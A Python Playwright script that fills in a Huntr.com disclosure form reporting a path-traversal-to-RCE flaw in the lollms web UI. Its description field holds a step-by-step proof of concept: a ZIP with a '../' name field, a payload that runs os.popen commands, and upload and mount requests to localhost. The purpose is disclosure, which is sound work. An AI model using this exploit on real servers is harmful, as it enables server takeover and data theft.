#!/usr/bin/env python3
"""
Huntr.com Auto-Fill Script
Automatically fills vulnerability disclosure form using Playwright

Usage: python3 autofill_huntr.py
"""

import asyncio
from playwright.async_api import async_playwright

async def fill_huntr_form():
    async with async_playwright() as p:
        # Launch browser (visible so you can review)
        browser = await p.chromium.launch(headless=False)
        context = await browser.new_context(
            viewport={"width": 1920, "height": 1080}
        )
        page = await context.new_page()
        
        print("=" * 60)
        print("Huntr.com Auto-Fill Script")
        print("=" * 60)
        
        # Navigate to form
        print("\n[*] Navigating to form...")
        await page.goto("https://huntr.com/bounties/disclose/opensource?target=https://github.com/parisneo/lollms")
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(3)
        
        # Check if logged in
        if "login" in await page.title():
            print("[!] NOT LOGGED IN!")
            print("[!] Please log in manually in the browser window")
            print("[*] Waiting 30 seconds...")
            await asyncio.sleep(30)
        
        print("\n[*] Filling form fields...")
        
        # CVSS Dropdowns - using keyboard navigation
        cvss_values = [
            ("Network", "Attack Vector"),
            ("Low", "Attack Complexity"),
            ("Low", "Privileges Required"),
            ("None", "User Interaction"),
            ("Unchanged", "Scope"),
            ("High", "Confidentiality"),
            ("High", "Integrity"),
            ("High", "Availability")
        ]
        
        print("\n[!] CVSS dropdowns require manual selection (JavaScript protected)")
        print("    Please select these values:")
        for value, label in cvss_values:
            print(f"      • {label}: {value}")
        
        # Wait for user to fill CVSS
        print("\n[*] You have 30 seconds to fill CVSS dropdowns...")
        await asyncio.sleep(30)
        
        # Fill Write-up Title
        print("\n[*] Filling Title...")
        title = "Path Traversal in /upload_app leads to RCE via custom function injection"
        await page.keyboard.press("Tab")  # Navigate to first text field
        await asyncio.sleep(0.5)
        await page.keyboard.type(title, delay=50)
        
        # Fill Description
        print("[*] Filling Description...")
        description = """# Description

A critical Path Traversal vulnerability has been discovered in the lollms-webui application that allows authenticated attackers to achieve Remote Code Execution (RCE) by uploading malicious ZIP files to the `/upload_app` endpoint.

The vulnerability exists in `lollms/server/endpoints/lollms_apps.py` at line 340, where the `name` field from `description.yaml` is used directly in path operations without proper sanitization.

## Technical Details:

- The `/upload_app` endpoint accepts ZIP file uploads for custom applications
- The `description.yaml` file inside the ZIP contains a `name` field
- This `name` field is used to construct the destination path without sanitization
- By setting `name` to `"../custom_function_calls/evil_func"`, attackers can escape the `apps_zoo` directory
- Once files are written to `custom_function_calls/`, the attacker can mount and execute arbitrary Python code
- This leads to full Remote Code Execution on the server

**CVSS Score**: 8.8 (High)
**CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

## Steps to Reproduce:

### Step 1: Get client_id via WebSocket
```python
import websocket, json, time, threading
client_id = None
def on_message(ws, message):
    data = json.loads(message)
    if "client_id" in str(data):
        client_id = data.get("client_id")
        ws.close()
ws = websocket.WebSocketApp("ws://localhost:9600/ws", on_message=on_message)
t = threading.Thread(target=ws.run_forever, daemon=True)
t.start()
time.sleep(3)
```

### Step 2: Create malicious ZIP
```python
import zipfile, io
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("description.yaml", "name: ../custom_function_calls/evil_func\\n")
    zf.writestr("function.py", "import os\\ndef execute(**kwargs):\\n    result = os.popen('id && hostname').read()\\n    with open('/tmp/pwned_lollms', 'w') as f:\\n        f.write(result)\\n    return {}")
```

### Step 3: Upload
```python
import requests
r = requests.post("http://localhost:9600/upload_app", params={"client_id": client_id}, files={"file": ("exploit.zip", buf.getvalue(), "application/zip")}, timeout=15)
```

### Step 4: Mount
```python
requests.post("http://localhost:9600/mount_function_call", json={"client_id": client_id, "function_category": "custom", "function_name": "evil_func"}, timeout=10)
```

### Step 5: Verify
Check if `/tmp/pwned_lollms` was created on the server.
"""
        
        await page.keyboard.press("Tab")
        await asyncio.sleep(0.5)
        await page.keyboard.type(description[:5000], delay=30)  # Truncate if too long
        
        # Fill Impact
        print("[*] Filling Impact...")
        impact = """This vulnerability allows authenticated attackers to achieve full Remote Code Execution on the server:

**Confidentiality Impact (HIGH)**: Attackers can read any file accessible by the lollms process including:
- Configuration files with API keys and credentials
- User data and conversation history
- Custom models and training data
- Environment variables and secrets

**Integrity Impact (HIGH)**: Attackers can write/overwrite arbitrary files:
- Plant backdoors in application code
- Modify configurations
- Inject malicious custom functions
- Deface the application

**Availability Impact (HIGH)**: Attackers can cause denial of service:
- Delete critical application files
- Corrupt the database
- Kill the lollms process

**Business Impact**:
- Complete server compromise
- Data breach of all user information
- Supply chain attack vector affecting all users
- Potential lateral movement into internal network"""
        
        await page.keyboard.press("Tab")
        await asyncio.sleep(0.5)
        await page.keyboard.type(impact, delay=30)
        
        # Fill Occurrences Permalink
        print("[*] Filling Occurrences...")
        permalink = "https://github.com/ParisNeo/lollms/blob/main/lollms/server/endpoints/lollms_apps.py#L340"
        await page.keyboard.press("Tab")
        await asyncio.sleep(0.5)
        await page.keyboard.type(permalink, delay=30)
        
        # Fill Occurrences Description
        occ_desc = "Unsanitized 'name' field from description.yaml allows path traversal via '../' sequences."
        await page.keyboard.press("Tab")
        await asyncio.sleep(0.5)
        await page.keyboard.type(occ_desc, delay=30)
        
        # Take screenshot
        print("[*] Taking screenshot...")
        await page.screenshot(path="huntr_filled.png", full_page=True)
        
        print("\n" + "=" * 60)
        print("[+] FORM FILLED!")
        print("=" * 60)
        print("\n[!] NEXT STEPS:")
        print("    1. Review all filled fields")
        print("    2. Check screenshot: huntr_filled.png")
        print("    3. Scroll down and click 'Submit Report'")
        print("\n[*] Browser will stay open for 60 seconds...")
        
        await asyncio.sleep(60)
        await browser.close()
        
        print("\n[+] Done!")


if __name__ == "__main__":
    asyncio.run(fill_huntr_form())
